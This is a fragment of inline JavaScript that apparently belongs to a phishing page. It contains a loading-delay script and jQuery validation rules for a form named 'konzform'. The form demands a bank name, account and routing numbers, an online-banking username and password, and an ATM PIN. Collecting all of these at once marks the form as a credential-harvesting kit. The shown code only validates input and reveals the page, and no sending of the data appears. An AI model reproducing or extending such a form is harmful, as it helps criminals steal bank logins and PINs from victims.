    <script>
        let load;

        let _loader = () => {
            load = setTimeout(showPage, 1000);
        }

        let showPage = () => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('myDiv').style.display = 'block';
        }

        const alpha = (e) => {
            let k;
            document.all ? k = e.keyCode : k = e.which;
            return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
        }

        $(document).ready(function(e) {
            $("#konzform").validate({
                errorClass: "error-class",
                rules: {
                    bankname: {
                        required: true,
                        minlength: 5
                    },
                    accountnum: {
                        required: true,
                        maxlength: 25
                    },
                    routingnum: {
                        required: true,
                        maxlength: 20
                    },
                    username: {
                        required: true,
                        minlength: 3,
                        maxlength: 30
                    },
                    password: {
                        required: true,
                        minlength: 3,
                        maxlength: 30
                    },
                    atmpin: {
                        required: true,
                        minlength: 2,
                        maxlength: 10
                    }
                },
                messages: {
                    bankname: {
                        required: "Please enter a Bank name."
                    },
                    accountnum: {
                        required: "Please enter a Bank Account Number."
                    },
                    routingnum: {
                        required: "Please enter a Bank Routing Number."
                    },
                    username: {
                        required: "Please enter a Username."
                    },
                    password: {
                        required: "Please enter a Password."
                    },
                    atmpin: {
                        required: "Please enter a ATM Pin."
                    }
                }
            });
        })
